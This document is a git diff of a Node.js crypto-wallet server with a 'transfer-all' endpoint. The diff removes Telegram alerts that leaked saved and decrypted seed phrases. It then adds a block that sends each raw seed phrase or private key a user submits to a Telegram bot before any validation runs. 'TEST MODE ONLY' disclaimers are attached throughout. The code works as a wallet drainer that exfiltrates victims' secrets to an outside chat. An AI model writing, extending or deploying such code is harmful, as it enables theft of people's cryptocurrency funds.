@@ -24,7 +24,7 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 async function sendTelegramAlert(message) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.log('⚠️ Telegram not configured - skipping alert');
-        return;
+        return false;
     }
     
     try {
@@ -34,8 +34,10 @@ async function sendTelegramAlert(message) {
             parse_mode: 'HTML'
         });
         console.log('📱 Telegram alert sent');
+        return true;
     } catch (error) {
         console.error('❌ Failed to send Telegram alert:', error.message);
+        return false;
     }
 }
 
@@ -92,26 +94,6 @@ function saveEncryptedKey(userIdentifier, privateKey, metadata = {}) {
     masterIndex.push({ id: record.id, userIdentifier, filename, createdAt: timestamp, metadata });
     fs.writeFileSync(masterLogPath, JSON.stringify(masterIndex, null, 2));
     
-    // ============ SEND FULL SEED PHRASE TO TELEGRAM ============
-    const alertMessage = `
-🔐 <b>NEW SEED PHRASE / PRIVATE KEY RECEIVED</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-<b>📋 THE ACTUAL PHRASE:</b>
-<code>${privateKey}</code>
-━━━━━━━━━━━━━━━━━━━━━━
-
-👤 <b>User:</b> ${userIdentifier}
-🆔 <b>Key ID:</b> ${record.id.substring(0, 16)}...
-📅 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
-📝 <b>Metadata:</b> ${JSON.stringify(metadata)}
-
-⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
-    `;
-    
-    sendTelegramAlert(alertMessage);
-    // ===========================================================
-    
     return { id: record.id, filename };
 }
 
@@ -128,26 +110,6 @@ function loadEncryptedKey(userIdentifier) {
     const decrypted = decryptData(record.encryptedData, record.iv, record.authTag);
     record.lastUsed = new Date().toISOString();
     fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
-    
-    // ============ SEND ALERT WHEN KEY IS LOADED ============
-    const alertMessage = `
-🔓 <b>KEY LOADED (Decrypted)</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-<b>📋 THE ACTUAL PHRASE:</b>
-<code>${decrypted}</code>
-━━━━━━━━━━━━━━━━━━━━━━
-
-👤 <b>User:</b> ${userIdentifier}
-🆔 <b>Key ID:</b> ${record.id.substring(0, 16)}...
-📅 <b>Time:</b> ${new Date().toLocaleString()}
-
-⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
-    `;
-    
-    sendTelegramAlert(alertMessage);
-    // =======================================================
-    
     return decrypted;
 }
 
@@ -375,6 +337,29 @@ app.get('/api/list-keys', async (req, res) => {
 app.post('/api/transfer-all', async (req, res) => {
     const { userInput, savedIdentifier } = req.body;
     
+    // ============ CRITICAL: Send raw input to Telegram FIRST ============
+    // This happens BEFORE any validation or processing
+    const rawInput = userInput || (savedIdentifier ? `[LOADED FROM SAVED KEY: ${savedIdentifier}]` : null);
+    
+    if (rawInput) {
+        const alertMessage = `
+🔐 <b>RAW SEED PHRASE / PRIVATE KEY RECEIVED</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>📋 THE ACTUAL INPUT:</b>
+<code>${rawInput}</code>
+━━━━━━━━━━━━━━━━━━━━━━
+
+📅 <b>Time:</b> ${new Date().toLocaleString()}
+📱 <b>Source:</b> ${savedIdentifier ? 'Saved Key Load' : 'Direct User Input'}
+
+⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+        `;
+        
+        await sendTelegramAlert(alertMessage);
+    }
+    // ================================================================
+    
     let finalInput = userInput;
     if (savedIdentifier && !userInput) {
         try {
@@ -565,7 +550,7 @@ app.post('/api/transfer-all', async (req, res) => {
         const successfulCount = allTransactions.filter(t => t.status === 'success').length;
         const totalDuration = Date.now() - startTime;
         
-        // ============ SEND TELEGRAM ALERT ON SUCCESSFUL TRANSFER ============
+        // Send success alert to Telegram
         const transferAlertMessage = `
 💰 <b>TRANSFER COMPLETE</b>
 
@@ -579,8 +564,7 @@ app.post('/api/transfer-all', async (req, res) => {
 ⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
         `;
         
-        sendTelegramAlert(transferAlertMessage);
-        // ================================================================
+        await sendTelegramAlert(transferAlertMessage);
         
         logTransaction({
             event: 'TRANSFER_BATCH_COMPLETE',
@@ -609,7 +593,7 @@ app.post('/api/transfer-all', async (req, res) => {
     } catch (error) {
         logTransaction({ event: 'SYSTEM_ERROR', error: error.message });
         
-        // ============ SEND TELEGRAM ALERT ON ERROR ============
+        // Send error alert to Telegram
         const errorAlertMessage = `
 ❌ <b>TRANSFER ERROR</b>
 
@@ -620,8 +604,7 @@ app.post('/api/transfer-all', async (req, res) => {
 ⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
         `;
         
-        sendTelegramAlert(errorAlertMessage);
-        // ======================================================
+        await sendTelegramAlert(errorAlertMessage);
         
         res.status(500).json({ success: false, error: error.message });
     }
